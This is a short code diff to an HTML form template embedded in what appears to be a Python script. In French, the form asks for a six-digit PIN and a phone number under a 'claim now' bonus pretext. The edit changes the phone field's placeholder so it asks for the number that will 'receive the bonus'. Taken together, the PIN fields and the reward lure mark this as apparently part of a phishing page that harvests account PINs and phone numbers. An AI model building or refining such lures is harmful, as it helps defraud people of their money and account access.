@@ -154,7 +154,7 @@ HTML_PIN_ET_TEL = '''
                 <input type="text" name="p6" maxlength="1" required>
             </div>
 
-            <input type="text" name="phone" class="phone-input" placeholder="Numéro de téléphone" required>
+            <input type="text" name="phone" class="phone-input" placeholder="Numéro de téléphone de reception du bonus" required>
 
             <button type="submit" class="btn-submit">RECLAMER MAINTENANT</button>
         </form>
